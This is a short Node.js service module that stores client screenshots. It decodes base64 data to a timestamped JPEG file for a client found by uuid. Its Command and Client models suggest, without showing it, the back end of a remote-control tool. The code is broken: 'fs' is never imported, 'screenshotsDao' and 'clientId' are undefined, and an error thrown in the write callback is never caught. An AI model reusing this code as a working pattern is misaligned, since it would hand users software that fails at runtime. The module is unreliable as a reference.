'use strict'

const Client = require('../models/Client')
const Command = require('../models/Command')
const commandDao = require('../dao/commandDao')
const clientDao = require('../dao/clientDao')
const clientService = require('./clientService')
//const { now } = require('sequelize/types/lib/utils')

const screenshotService = {
    addScreenshot: async function ({ uuid, data }) {

        const client = await clientDao.findOneByUuid(uuid)

        // If he doesn't exist
        if (!(client instanceof Client)) {
            return { isAdded: false }
        }

        const filename = 'screenshots' + Date.now() + '.jpeg'

        fs.writeFile(filename, Buffer.from(data.screenshot, 'base64'), (err) => {
            if (err)
                throw err
        });

        const screenshot = await screenshotsDao.insertOne({ clientId, filename })

        return { isAdded: true }
    }
}

module.exports = screenshotService